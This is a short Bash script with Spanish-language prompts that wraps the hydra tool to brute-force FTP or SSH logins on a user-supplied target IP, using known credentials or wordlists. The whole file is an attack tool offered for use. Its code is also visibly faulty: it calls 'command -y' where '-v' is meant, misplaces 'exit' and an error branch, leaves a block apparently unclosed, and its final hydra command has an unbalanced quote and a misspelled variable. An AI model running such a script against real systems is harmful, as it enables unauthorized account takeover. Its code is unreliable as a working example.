#!/bin/bash

read -p "Porfavor Introduzca la IP Objetivo. > " target
echo && echo "Usted conoce el usuario? (Y/n).";read -p "> " userchoice
if [[ "$userchoice" = "Y" || "$userchoice" = "y" ]]; then
    read -p "porfavor entra nombre de usuario > " userfinalchoice
    echo ;read -p "Porfavor escriba -l > " knuss
 elif [[ "$userchoice" = "N" || "$userchoice" = "n" ]]; then
     read -p "Introduzca el nombre del diccionario (en la carpeta actual) > " diccname
      echo ;read -p "Escriba porfavor -L > " unkuss
 else
   echo ;echo "Incorrect." exit
fi
echo ;echo "Usted conoce la contraseña? (Y/n)";read -p "> " passwdchoice
if [[ "$passwdchoice" = "Y" || "$passwdchoice" = "y" ]]; then
    read -p "Porfavor entra la contraseña." pwwdkn
    echo ;read -p "Porfavor escriba -p > " knpwwd
 else
    read -p "Porfavor introduce el nombre del diccionario (En la carpeta actual) > " passwddicc
    echo ;read -p "Porfavor Escriba -P > " uknpwwd
fi
read -p "Elije servicio, FTP | SSH / (escribe FTP o SSH) > " servicechoice
if ! command -y hydra &> /dev/null 2>&1; then
   echo "Hydra No esta instalado, quieres instalarlo?"
   read -p "> " HIC
   if [[ "$HIC" = "Y" || "$HIC" = "y" ]]; then
      echo ;echo "> Installing hydra."
      apt install hydra > /dev/null 2>&1
      sleep 3; if ! command -y hydra &> /dev/null; then
          echo "No se instalo, Error." && exit
        else
          echo "Incorrecto, porfavor de una respuesta certera, Y o n."
        fi
  else
       echo ;echo "Hydra no se instalo." && exit
fi

if [ ! -f "$diccname".txt ]; then
   echo -e "No existe el diccionario. Colocalo en el directiorio del script en ejecucion."
   exit
   else
   echo ;echo "Diccionario Verificado.."
fi

echo ;echo "Iniciando Ataque.." 

hydra "$knuss" "$userfinalchoice" "$unkuss" "$diccname".txt "$kwpwwd "$pwwdkn" "$uknpwwd" "$passwddicc".txt "$servicechoice" "$target"

